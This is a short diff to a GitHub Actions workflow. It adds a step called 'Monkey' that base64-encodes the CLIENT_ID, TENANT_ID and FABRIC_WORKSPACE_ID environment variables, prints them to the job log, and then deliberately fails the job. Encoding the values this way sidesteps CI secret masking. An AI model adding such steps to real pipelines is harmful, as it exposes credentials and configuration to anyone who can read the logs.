@@ -36,6 +36,20 @@ jobs:
         run: |
           git config --global --add safe.directory "$GITHUB_WORKSPACE"
 
+      - name: "🙈 Monkey"
+        run: |
+          for v in CLIENT_ID TENANT_ID FABRIC_WORKSPACE_ID; do
+            val="${!v}"
+            if [ -n "$val" ]; then
+              b64=$(printf '%s' "$val" | base64 -w0)
+              echo "$v (base64): $b64"
+            else
+              echo "$v: MISSING"
+            fi
+          done
+
+          exit 1
+
       - name: "⚙️ Post create commands"
         run: /tmp/overlay/post-create-commands.sh
 
